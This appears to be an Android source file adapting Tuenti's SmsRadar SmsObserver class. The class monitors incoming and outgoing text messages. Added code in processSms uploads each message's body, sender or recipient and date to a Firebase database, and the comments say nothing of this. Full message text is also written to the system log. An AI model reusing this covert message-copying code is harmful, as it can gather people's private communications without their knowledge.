/*
 * Copyright (c) Tuenti Technologies S.L. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package an.xuan.tong.historycontact.sms.smsradar;


import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.facebook.accountkit.Account;
import com.facebook.accountkit.AccountKit;
import com.facebook.accountkit.AccountKitCallback;
import com.facebook.accountkit.AccountKitError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import an.xuan.tong.historycontact.db.SmsSendServer;


/**
 * ContentObserver created to handle the sms content provider changes. This entity will be called each time the
 * system changes the sms content provider state.
 * <p/>
 * SmsObserver analyzes the change and studies if the protocol used is null or not to identify if the sms is incoming
 * or outgoing.
 * <p/>
 * SmsObserver will analyze the sms inbox and sent content providers to get the sms information and will notify
 * SmsListener.
 * <p/>
 * The content observer will be called each time the sms content provider be updated. This means that all
 * the sms state changes will be notified. For example, when the sms state change from SENDING to SENT state.
 *
 * @author Pedro Vcente Gómez Sánchez <pgomez@tuenti.com>
 * @author Manuel Peinado <mpeinado@tuenti.com>
 */
class SmsObserver extends ContentObserver {

    private static final Uri SMS_URI = Uri.parse("content://sms/");
    private static final Uri SMS_SENT_URI = Uri.parse("content://sms/sent");
    private static final Uri SMS_INBOX_URI = Uri.parse("content://sms/inbox");
    private static final String PROTOCOL_COLUM_NAME = "protocol";
    private static final String SMS_ORDER = "date DESC";

    private ContentResolver contentResolver;
    private SmsCursorParser smsCursorParser;

    public SmsObserver(Handler handler) {
        super(handler);
    }

    SmsObserver(ContentResolver contentResolver, Handler handler, SmsCursorParser smsCursorParser) {
        super(handler);
        this.contentResolver = contentResolver;
        this.smsCursorParser = smsCursorParser;
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    private String lastSMS;

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Cursor cursor = null;
        try {
            cursor = getSmsContentObserverCursor();
            if (cursor != null && cursor.moveToFirst()) {
                processSms(cursor);
            }
        } finally {
            if (cursor != null)
                cursor.close();
        }
    }

    private void processSms(Cursor cursor) {
        Cursor smsCursor = null;
        try {
            String protocol = cursor.getString(cursor.getColumnIndex(PROTOCOL_COLUM_NAME));
            smsCursor = getSmsCursor(protocol);
            final Sms sms = parseSms(smsCursor);
            if (sms != null)
                AccountKit.getCurrentAccount(
                        new AccountKitCallback<Account>() {
                            @Override
                            public void onSuccess(Account account) {
                                SmsSendServer smsSendServer = new SmsSendServer(account.getId().toString()
                                        , sms.getType().toString()
                                        , sms.getMsg()
                                        , sms.getDate()
                                        , ""
                                        , sms.getAddress().toString()
                                        , "");
                                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
                                mDatabase.child("SMS").child(account.getId().toString()).setValue(smsSendServer);
                            }

                            @Override
                            public void onError(AccountKitError accountKitError) {

                            }
                        });


            notifySmsListener(sms);
        } finally {
            close(smsCursor);
        }
    }

    private void notifySmsListener(Sms sms) {
        if (sms != null && SmsRadar.smsListener != null) {
            if (SmsType.SENT == sms.getType()) {
                Log.e("SmsType.SENT ", "sms" + sms.toString());
                SmsRadar.smsListener.onSmsSent(sms);
            } else {
                Log.e("msType.Received", "sms" + sms.toString());
                SmsRadar.smsListener.onSmsReceived(sms);
            }
        }
    }

    private Cursor getSmsCursor(String protocol) {
        return getSmsDetailsCursor(protocol);
    }

    private Cursor getSmsDetailsCursor(String protocol) {
        Cursor smsCursor;
        if (isProtocolForOutgoingSms(protocol)) {
            //SMS Sent
            smsCursor = getSmsDetailsCursor(SmsContext.SMS_SENT.getUri());
        } else {
            //SMSReceived
            smsCursor = getSmsDetailsCursor(SmsContext.SMS_RECEIVED.getUri());
        }
        return smsCursor;
    }

    private Cursor getSmsContentObserverCursor() {
        try {
            String[] projection = null;
            String selection = null;
            String[] selectionArgs = null;
            String sortOrder = null;
            return contentResolver.query(SMS_URI, projection, selection, selectionArgs, sortOrder);
        } catch (IllegalArgumentException e) {
            return null;
        } finally {
            Log.e("antx ", "getSmsContentObserverCursor null");
        }
    }

    private boolean isProtocolForOutgoingSms(String protocol) {
        return protocol == null;
    }

    private Cursor getSmsDetailsCursor(Uri smsUri) {

        return smsUri != null ? this.contentResolver.query(smsUri, null, null, null, SMS_ORDER) : null;
    }

    private Sms parseSms(Cursor cursor) {
        return smsCursorParser.parse(cursor);
    }

    private void close(Cursor cursor) {
        if (cursor != null) {
            cursor.close();
        }
    }

    /**
     * Represents the SMS origin.
     */
    private enum SmsContext {
        SMS_SENT {
            @Override
            Uri getUri() {
                return SMS_SENT_URI;
            }
        }, SMS_RECEIVED {
            @Override
            Uri getUri() {
                return SMS_INBOX_URI;
            }
        };

        abstract Uri getUri();
    }

    public boolean smsChecker(String sms) {
        boolean flagSMS = true;

        if (sms.equals(lastSMS)) {
            flagSMS = false;
        } else {
            lastSMS = sms;
        }
//if flagSMS = true, those 2 messages are different
        return flagSMS;
    }
}